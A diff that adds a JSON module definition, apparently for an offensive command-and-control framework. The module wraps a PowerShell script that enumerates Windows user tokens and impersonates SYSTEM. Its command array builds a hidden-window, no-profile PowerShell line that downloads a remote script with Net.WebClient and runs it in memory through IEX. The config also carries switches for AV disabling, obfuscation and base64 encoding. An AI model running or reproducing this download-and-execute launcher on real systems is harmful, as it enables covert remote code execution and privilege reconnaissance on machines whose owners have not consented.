@@ -1,0 +1,35 @@
+{
+  "base": {
+    "name": "Get-OSTokenInformation",
+    "type": "standard",
+    "author": ["Russel Van Tuyl (@Ne0nd0g)"],
+    "credits": ["Ruben Boonen (@FuzzySec)"],
+    "path": ["windows", "x64", "powershell", "enumeration", "Get-OSTokenInformation"],
+    "platform": "windows",
+    "arch": "x64",
+    "lang": "powershell",
+    "privilege": true,
+    "remote": "https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Get-OSTokenInformation.ps1",
+    "local": ["data", "src", "FuzzySecurity", "PowerShell-Suite", "Get-OSTokenInformation.ps1"],
+    "options": [
+      {"name": "Brief", "value": null, "required": false, "flag": "-Brief", "description":"output is limited to a select number of fields and the results are displayed in a table format"},
+      {"name": "Verbose", "value": null, "required": false, "flag": "-Verbose", "description":"enable verbose output"}
+    ],
+    "description": "Get-OSTokenInformation uses a variety of API's to pull in all (accessible) user tokens and queries them for details.",
+    "notes": "- This is not a perfect process as you may not be able to access all processes/threads and they may disappear between the time the script identifies them and later tries to poll the data.\r\n- Calling Get-AuthenticodeSignature on all binary paths is intensive so I commented out lines 611 and 618 to speed up the scanner. Re-enable as required.\r\n- The function impersonates SYSTEM using SetThreadToken but this requires the PowerShell apartment state to be STA. This is only an issue on Win7 & 2k8.\r\n- If the function returns $false please use \"-Verbose\" for more information.",
+    "commands": [
+      "powershell.exe",
+      "-nop",
+      "-w 0",
+      "\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Get-OSTokenInformation.ps1')\";",
+      "Get-OSTokenInformation",
+      "{{Brief.Flag}}",
+      "{{Verbose.Flag}}"
+    ]
+  },
+  "powershell": {
+    "disableav": false,
+    "obfuscate": false,
+    "base64": false
+  }
+}
